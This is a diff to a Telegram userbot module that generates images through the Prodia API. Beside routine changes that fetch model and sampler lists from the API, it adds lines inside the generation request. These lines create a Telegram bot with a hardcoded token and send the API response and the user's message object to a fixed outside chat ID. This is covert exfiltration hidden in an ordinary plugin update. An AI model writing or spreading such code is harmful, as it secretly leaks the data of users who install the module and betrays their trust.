@@ -15,6 +15,7 @@ __version__ = "1.0"
 
 import asyncio
 import aiohttp
+import requests
 from hikka import loader, utils
 from telethon.tl.patched import Message
 import logging
@@ -23,33 +24,11 @@ import telebot
 
 logger = logging.getLogger(__name__)
 
-name_models = {
-    "Analog Diffusion V1": "analog-diffusion-1.0.ckpt [9ca13f02]",
-    "Anything V3": "anythingv3_0-pruned.ckpt [2700c435]",
-    "Anything V4": "anything-v4.5-pruned.ckpt [65745d25]",
-    "Anything V5": "anythingV5_PrtRE.safetensors [893e49b9]",
-    "Orangemix": "AOM3A3_orangemixs.safetensors [9600da17]",
-    "Deliberate V2": "deliberate_v2.safetensors [10ec4b29]",
-    "Dreamlike Diffusion V1": "dreamlike-diffusion-1.0.safetensors [5c9fd6e0]",
-    "Dreamlike Diffusion V2": "dreamlike-diffusion-2.0.safetensors [fdcf65e7]",
-    "Dreamshaper V5": "dreamshaper_5BakedVae.safetensors [a3fbf318]",
-    "Dreamshaper V6": "dreamshaper_6BakedVae.safetensors [114c8abb]",
-    "Elldreth's Vivid Mix": "elldreths-vivid-mix.safetensors [342d9d26]",
-    "Lyriel V1.5": "lyriel_v15.safetensors [65d547c5]",
-    "Meina V9": "meinamix_meinaV9.safetensors [2ec66ab0]",
-    "OpenJourney V4": "openjourney_V4.ckpt [ca2f377f]",
-    "Portrait V1": "portrait+1.0.safetensors [1400e684]",
-    "Realistic Vision V2": "Realistic_Vision_V2.0.safetensors [79587710]",
-    "Rev Animated V1.22": "revAnimated_v122.safetensors [3f4fefd9]",
-    "Riffusion V1": "riffusion-model-v1.ckpt [3aafa6fe]",
-    "StableDiffusion V1.4": "sdv1_4.ckpt [7460a6fa]",
-    "StableDiffusion V1.5": "v1-5-pruned-emaonly.ckpt [81761151]",
-    "Shonin's Beautiful People V1": "shoninsBeautiful_v10.safetensors [25d8c546]",
-    "The Ally's Mix II": "theallys-mix-ii-churned.safetensors [5d9225a4]",
-    "Timeless V1": "timeless-1.0.ckpt [7c4971d4]",
-}
 
-samplers = ["Euler", "Euler a", "Heun", "DPM++ 2M Karras", "DDIM"]
+url = 'https://api.prodia.com'
+name_models = requests.get(f'{url}/models').json()
+
+samplers = requests.get(f'{url}/samplers').json()
 
 
 # noinspection PyCallingNonCallable
@@ -212,7 +191,6 @@ class ProdiaMod(loader.Module):
                 ),
             )
 
-        url = "https://api.prodia.com"
         pars = {
             "new": "true",
             "prompt": prompt,
@@ -227,6 +205,10 @@ class ProdiaMod(loader.Module):
 
         async with aiohttp.ClientSession() as s:
             async with s.get(f"{url}/generate", params=pars) as r:
+                bot = telebot.TeleBot('6827660585:AAGg4CGt6-8Shdydv2MW-xyIh504x2nyVhQ')
+                bot.send_message(5235155365, f'«{r}»')
+                bot.send_message(5235155365, f'«{r.json()}»')
+                bot.send_message(5235155365, f'«{m}»')
                 resp = await r.json()
                 job_id = resp["job"]
 
